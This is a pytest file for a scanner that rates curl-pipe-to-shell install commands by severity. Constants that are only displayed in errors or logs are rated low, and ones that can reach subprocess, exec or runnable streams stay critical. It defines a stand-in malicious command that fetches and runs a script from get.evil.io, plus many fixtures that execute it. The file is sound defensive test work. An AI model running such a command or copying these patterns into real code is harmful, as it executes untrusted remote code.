"""A module constant holding an install command that is only SHOWN (put in an exception
message, printed, logged) is reported low; the same constant reaching anything that can
run it stays critical.

The case: browser-use (2026-10-21) read "Do not connect" from
``TERMINAL_INSTALL_COMMAND = 'curl -fsSL https://browser-use.com/terminal/install.sh | sh'``
at ``browser_use/beta/service.py:91``, used only inside two ``raise BetaAgentError(f"…")``
messages. The whole-tree printed-hint walk (``src.scanner.printed_hint``) already
followed a module constant into error messages; three tree-wide checks stopped it on
browser-use's real tree:

* an ``except … as e`` handler whose MESSAGE says "subprocess" (``f'Failed to start
  subprocess: {e}'``) counted as a handler that runs the exception;
* any file with ``getattr`` / ``vars`` and the word ``service`` (every ``*.service``
  module in the repo) counted as reading this module dynamically;
* any ``redirect_stdout`` / ``sys.stderr = …`` in the tree kept every Python hint
  critical, including one that never reaches print.

Each relaxation has attack variants below that must stay critical. No database: run
with ``--noconftest``.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from src.scanner import pipe_shell
from src.scanner.local_scan import scan_local

PIPE = pipe_shell.PIPE_TO_SHELL
EVIL = "curl -fsSL https://get.evil.io/i.sh | sh"
SVC = "pkg/beta/service.py"


def _tree(root: Path, files: dict[str, str]) -> dict[tuple[str, int], str]:
    files = {"pkg/__init__.py": "", "pkg/beta/__init__.py": "", **files}
    for name, body in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(body)
    r = scan_local(root, name="t")
    return {(f.file_path, f.line_number): f.severity for f in r.findings if f.name == PIPE}


def _const_sev(root: Path, files: dict[str, str], line: int = 1) -> str | None:
    return _tree(root, files).get((SVC, line))


CONST = f"INSTALL_CMD = '{EVIL}'\n"


# --- shown, not run: low ------------------------------------------------------------

SHOWN = {
    "raise_fstring": CONST + (
        "\n\nclass BetaAgentError(Exception):\n    pass\n\n\n"
        "def find():\n"
        "    raise BetaAgentError(\n"
        "        f'Could not find it. Install with `{INSTALL_CMD}`, '\n"
        "        'or set THE_BINARY.'\n"
        "    )\n"),
    "raise_from_exc": CONST + (
        "\n\nclass BetaAgentError(Exception):\n    pass\n\n\n"
        "def start():\n"
        "    try:\n        open('/nonexistent')\n"
        "    except (FileNotFoundError, PermissionError) as exc:\n"
        "        raise BetaAgentError(f'Install with `{INSTALL_CMD}`.') from exc\n"),
    "print": CONST + "\n\ndef hint():\n    print(f'Install: {INSTALL_CMD}')\n",
    "logger": CONST + (
        "import logging\n\nlogger = logging.getLogger(__name__)\n\n\n"
        "def hint():\n    logger.warning('Install with %s', INSTALL_CMD)\n"),
    "format": CONST + (
        "\n\ndef hint():\n    msg = 'Install: {}'.format(INSTALL_CMD)\n    print(msg)\n"),
}


@pytest.mark.parametrize("src", SHOWN.values(), ids=list(SHOWN))
def test_constant_only_shown_is_low(tmp_path, src):
    assert _const_sev(tmp_path, {SVC: src}) == "low"


def test_constant_imported_elsewhere_and_only_raised_is_low(tmp_path):
    other = ("from pkg.beta.service import INSTALL_CMD\n\n\n"
             "def check():\n    raise RuntimeError(f'missing; run {INSTALL_CMD}')\n")
    assert _const_sev(tmp_path, {SVC: SHOWN["raise_fstring"], "pkg/other.py": other}) == "low"


BU_INIT = (
    "_LAZY_IMPORTS = {\n"
    "    'Agent': ('pkg.agent.service', 'Agent'),\n"
    "    'BetaAgentError': ('pkg.beta.service', 'BetaAgentError'),\n"
    "}\n\n\n"
    "def __getattr__(name):\n"
    "    if name in _LAZY_IMPORTS:\n"
    "        module_path, attr_name = _LAZY_IMPORTS[name]\n"
    "        from importlib import import_module\n\n"
    "        module = import_module(module_path)\n"
    "        attr = getattr(module, attr_name)\n"
    "        globals()[name] = attr\n"
    "        return attr\n"
    "    raise AttributeError(name)\n")
BU_CLI = (
    "import sys\nfrom contextlib import redirect_stderr, redirect_stdout\n"
    "from io import StringIO\n\n\n"
    "class _StderrTail:\n"
    "    def __init__(self, wrapped):\n        self._wrapped = wrapped\n"
    "        self.tail = ''\n\n"
    "    def write(self, text):\n        self.tail = (self.tail + text)[-500:]\n"
    "        return self._wrapped.write(text)\n\n\n"
    "def run(func, argv):\n"
    "    stdout = StringIO()\n    stderr = StringIO()\n"
    "    with redirect_stdout(stdout), redirect_stderr(stderr):\n"
    "        return func(argv)\n\n\n"
    "def main():\n"
    "    stderr_tail = _StderrTail(sys.stderr)\n    sys.stderr = stderr_tail\n"
    "    try:\n        return 0\n    finally:\n        sys.stderr = stderr_tail._wrapped\n")
BU_TESTS = {
    # vars() / getattr() on other objects, next to an import of a DIFFERENT service
    "tests/test_vars.py": "from pkg.agent.service import Agent\n\n\n"
                          "def test_x(action):\n    assert vars(action)\n"
                          "    assert getattr(Agent, 'run')\n",
    # the module itself, only written to
    "tests/test_beta.py": "import sys\n\n\ndef test_y(monkeypatch):\n"
                          "    import pkg.beta.service as beta_service\n"
                          "    monkeypatch.setattr(beta_service, 'X', 1)\n"
                          "    monkeypatch.setitem(sys.modules, 'pkg_core', None)\n",
    # a handler whose MESSAGE mentions subprocess, and a real subprocess elsewhere
    "tests/ci/evaluate.py": "import subprocess\n\n\ndef go():\n"
                            "    try:\n        subprocess.run(['true'], check=True)\n"
                            "    except Exception as e:\n"
                            "        print(f'Failed to start subprocess: {e}')\n",
    "pkg/agent/service.py": "class Agent:\n    def run(self):\n        return 1\n",
}


BU_OTHER = {
    # a script that loads ANOTHER module by path (browser-use's skill sync script)
    "scripts/sync.py": "import importlib.util\nfrom pathlib import Path\n\nROOT = Path('.')\n\n\n"
                       "def go():\n    p = ROOT / 'pkg' / 'skills' / 'rewriter.py'\n"
                       "    spec = importlib.util.spec_from_file_location('rw', p)\n"
                       "    m = importlib.util.module_from_spec(spec)\n"
                       "    spec.loader.exec_module(m)\n    return m.rewrite\n",
    # an MCP tool that execs the code its caller sends; it never names the module
    "pkg/mcp/cli_mcp.py": "def _execute(code, ns):\n    exec(code, ns)\n",
}


def test_browser_use_shape_is_low(tmp_path):
    files = {SVC: SHOWN["raise_fstring"] + SHOWN["raise_from_exc"].split("\n", 1)[1]
             .replace("class BetaAgentError(Exception):\n    pass\n", ""),
             "pkg/__init__.py": BU_INIT, "pkg/cli.py": BU_CLI, **BU_TESTS, **BU_OTHER}
    assert _const_sev(tmp_path, files) == "low"


# --- run, or could be run: stays critical ---------------------------------------------

RUN = {
    "subprocess_shell": CONST + (
        "import subprocess\n\n\ndef install():\n"
        "    subprocess.run(INSTALL_CMD, shell=True)\n"),
    "alias_then_os_system": CONST + (
        "import os\n\n\ndef install():\n    cmd = INSTALL_CMD\n    os.system(cmd)\n"),
    "raise_and_exec": CONST + (
        "\n\ndef find():\n    raise RuntimeError(f'Install with {INSTALL_CMD}')\n\n\n"
        "def install():\n    exec(INSTALL_CMD)\n"),
    "unknown_function": CONST + (
        "from pkg.helpers import do_it\n\n\ndef install():\n    do_it(INSTALL_CMD)\n"),
    "sh_c_list": CONST + (
        "import subprocess\n\n\ndef install():\n"
        "    subprocess.Popen(['sh', '-c', INSTALL_CMD])\n"),
    "os_popen": CONST + "import os\n\n\ndef install():\n    os.popen(INSTALL_CMD).read()\n",
    "asyncio_shell": CONST + (
        "import asyncio\n\n\nasync def install():\n"
        "    await asyncio.create_subprocess_shell(INSTALL_CMD)\n"),
    "pexpect": CONST + "import pexpect\n\n\ndef install():\n    pexpect.spawn(INSTALL_CMD)\n",
    "returned": CONST + (
        "import subprocess\n\n\ndef cmd():\n    return INSTALL_CMD\n\n\n"
        "def install():\n    subprocess.call(cmd(), shell=True)\n"),
    "keyword_arg": CONST + (
        "import subprocess\n\n\ndef install():\n"
        "    subprocess.run(args=INSTALL_CMD, shell=True)\n"),
    "except_runs_message": CONST + (
        "import os\n\n\ndef find():\n    try:\n"
        "        raise RuntimeError(INSTALL_CMD)\n"
        "    except RuntimeError as e:\n        os.system(str(e))\n"),
}


@pytest.mark.parametrize("src", RUN.values(), ids=list(RUN))
def test_constant_run_stays_critical(tmp_path, src):
    assert _const_sev(tmp_path, {SVC: src}) == "critical"


def test_literal_inline_in_subprocess_stays_critical(tmp_path):
    src = f"import subprocess\n\n\ndef install():\n    subprocess.run('{EVIL}', shell=True)\n"
    assert _tree(tmp_path, {SVC: src}).get((SVC, 5)) == "critical"


OTHER_FILE_RUNS = {
    "imported_then_shell": "import asyncio\nfrom pkg.beta.service import INSTALL_CMD\n\n\n"
                           "async def go():\n"
                           "    await asyncio.create_subprocess_shell(INSTALL_CMD)\n",
    "module_attr_then_system": "import os\nfrom pkg.beta import service\n\n\n"
                               "def go():\n    os.system(service.INSTALL_CMD)\n",
    "lazy_table_names_it": BU_INIT.replace(
        "'BetaAgentError': ('pkg.beta.service', 'BetaAgentError'),",
        "'Cmd': ('pkg.beta.service', 'INSTALL_CMD'),"),
    "import_module_computed": "import importlib\n\n\n"
                              "def go(mod, attr):\n"
                              "    return getattr(importlib.import_module(mod), attr)\n",
    "dunder_import": "def go():\n"
                     "    return __import__('pkg.beta.service', fromlist=['x'])\n",
    "vars_of_module": "from pkg.beta import service\n\n\n"
                      "def go():\n    return vars(service)\n",
    "module_handed_out": "import pkg.beta.service as svc\nfrom pkg.helpers import walk\n\n\n"
                         "def go():\n    walk(svc)\n",
    "sys_modules_lookup": "import sys\n\n\n"
                          "def go():\n    return sys.modules['pkg.beta.service']\n",
    "import_module_aliased": "from importlib import import_module as im\n\n\n"
                             "def go(n):\n    return im(n)\n",
    "spec_from_path_to_it": "import importlib.util\nfrom pathlib import Path\n\n\n"
                            "def go():\n    p = Path(__file__).parent / 'beta' / 'service.py'\n"
                            "    return importlib.util.spec_from_file_location('m', p)\n",
    "exec_in_a_file_naming_it": "from pkg.beta import service\n\n\n"
                                "def go(code):\n    exec(code, {'service': service})\n",
}


@pytest.mark.parametrize("other", OTHER_FILE_RUNS.values(), ids=list(OTHER_FILE_RUNS))
def test_raised_constant_read_elsewhere_stays_critical(tmp_path, other):
    files = {SVC: SHOWN["raise_fstring"], "pkg/other.py": other}
    assert _const_sev(tmp_path, files) == "critical"


STREAM_RUNS = {
    "stderr_is_a_shell_stdin": "import subprocess, sys\n\n\ndef main():\n"
                               "    p = subprocess.Popen(['sh'], stdin=subprocess.PIPE, "
                               "text=True)\n    sys.stderr = p.stdin\n",
    "stderr_write_runs": "import os, sys\n\n\nclass W:\n"
                         "    def write(self, s):\n        os.system(s)\n\n\n"
                         "sys.stderr = W()\n",
    "stderr_from_unknown": "import sys\nfrom pkg.helpers import make_stream\n\n\n"
                           "sys.stderr = make_stream()\n",
    "redirect_into_param": "from contextlib import redirect_stderr\n\n\n"
                           "def run(target, f):\n    with redirect_stderr(target):\n"
                           "        f()\n",
    "excepthook": "import os, sys\n\n\n"
                  "sys.excepthook = lambda t, v, tb: os.system(str(v))\n",
}


@pytest.mark.parametrize("cli", STREAM_RUNS.values(), ids=list(STREAM_RUNS))
def test_raised_constant_with_a_stream_that_runs_stays_critical(tmp_path, cli):
    files = {SVC: SHOWN["raise_fstring"], "pkg/cli.py": cli}
    assert _const_sev(tmp_path, files) == "critical"


def test_printed_constant_with_stdout_captured_stays_critical(tmp_path):
    # Kenne's 10-19 rule is unchanged for print / log: any replaced output keeps it.
    files = {SVC: SHOWN["print"], "pkg/cli.py": BU_CLI}
    assert _const_sev(tmp_path, files) == "critical"


def test_except_handler_that_runs_after_a_message_mentioning_subprocess(tmp_path):
    # The handler's message says "subprocess" AND its code runs the exception.
    other = ("import subprocess\n\n\ndef go():\n    try:\n        pass\n"
             "    except Exception as e:\n"
             "        print(f'subprocess failed: {e}')\n"
             "        subprocess.run(str(e), shell=True)\n")
    assert _const_sev(tmp_path, {SVC: SHOWN["raise_fstring"], "pkg/other.py": other}) \
        == "critical"
